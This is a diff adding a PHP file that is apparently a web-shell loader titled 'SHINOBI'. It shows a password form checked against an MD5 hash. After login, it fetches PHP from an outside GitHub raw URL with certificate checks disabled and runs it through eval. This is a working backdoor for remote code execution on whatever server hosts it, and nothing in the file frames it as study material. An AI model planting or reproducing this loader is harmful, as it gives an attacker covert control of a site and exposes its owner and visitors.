@@ -1,0 +1,108 @@
+<?php
+session_start();
+
+function geturlsinfo($url) {
+    if (function_exists('curl_exec')) {
+        $conn = curl_init($url);
+        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
+
+        // Set cookies using session if available
+        if (isset($_SESSION['coki'])) {
+            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['coki']);
+        }
+
+        $url_get_contents_data = curl_exec($conn);
+        curl_close($conn);
+    } elseif (function_exists('file_get_contents')) {
+        $url_get_contents_data = file_get_contents($url);
+    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
+        $handle = fopen($url, "r");
+        $url_get_contents_data = stream_get_contents($handle);
+        fclose($handle);
+    } else {
+        $url_get_contents_data = false;
+    }
+    return $url_get_contents_data;
+}
+
+function is_logged_in()
+{
+    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
+}
+
+if (isset($_POST['password'])) {
+    $entered_password = $_POST['password'];
+    $hashed_password = '6666cd76f96956469e7be39d750cc7d9';
+    if (md5($entered_password) === $hashed_password) {
+
+        $_SESSION['logged_in'] = true;
+        $_SESSION['coki'] = 'asu'; 
+    } else {
+        // Password is incorrect
+        echo "Incorrect password. Please try again.";
+    }
+}
+
+if (is_logged_in()) {
+    $a = geturlsinfo('https://raw.githubusercontent.com/anbublackops2077/1337/refs/heads/main/root.php');
+    eval('?>' . $a);
+} else {
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>SHINOBI</title>
+    </head>
+
+    <link rel="icon" type="image/png" href="https://i.imgur.com/EGUcN1g.png">
+</head>
+<body>
+    <style>
+    @import url("https://fonts.googleapis.com/css?family=Dosis");
+    @import url("https://fonts.googleapis.com/css?family=Carrois+Gothic");
+    @import url("https://fonts.googleapis.com/css?family=Bungee+Outline");
+    body {
+        font-family: "Dosis", cursive;
+        color: #fff;
+        text-shadow:0px 0px 1px #757575;
+        background-color: #212529;
+        background-size: cover;
+        background-attachment: fixed;
+        background-repeat: no-repeat;
+        background-size: 7%, 7%;
+        background-position: right bottom, left bottom;
+    }
+    input { 
+        margin-bottom: 4px; 
+        background: rgba(0,0,0,0.3);
+        border: none;
+        outline: none;
+        padding: 5px;
+        font-size: 15px;
+        color: #fff;
+        text-shadow: 1px 1px 1px rgba(0,0,0,0.3);
+        border: 1px solid rgba(0,0,0,0.3);
+        border-radius: 14px;
+        box-shadow: inset 0 -5px 45px rgba(100,100,100,0.2), 0 1px 1px rgba(255,255,255,0.2);
+        -webkit-transition: box-shadow .5s ease;
+        -moz-transition: box-shadow .5s ease;
+        -o-transition: box-shadow .5s ease;
+        -ms-transition: box-shadow .5s ease;
+        transition: box-shadow .5s ease;
+    }
+   </style>
+<body>
+    <form method="POST" action="">
+            <label for="password">PASSWORD:</label>
+            <input type="password" id="password" name="password">
+            <input type="submit" value="LOGIN">
+    </form>
+    </body>
+    </html>
+    <?php
+}
+?>
